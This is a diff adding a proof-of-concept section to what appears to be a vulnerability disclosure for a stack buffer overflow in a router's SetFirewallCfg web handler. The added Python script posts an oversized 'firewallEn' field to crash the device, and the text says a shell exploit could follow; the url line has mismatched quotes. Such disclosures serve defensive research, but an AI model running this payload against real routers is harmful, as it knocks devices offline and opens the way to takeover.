@@ -11,3 +11,20 @@ The program directly copies the content of src into the stack buffer dest, using
 
    
    ![My Image](8.png)
+
+## 3 POC
+```python
+import requests
+
+url = 'http://IP:port/goform/SetFirewallCfg"
+
+headers = {"Cookie": "password=You cookie"}
+
+data = {
+    'serverEn': 2,
+    'firewallEn': 'l' * 10000
+}
+res = requests.post(url=url, headers=headers, data=data)
+print(res.text)
+```
+You can observe the router crashing, and ultimately, it is possible to craft an exploit to gain a shell.
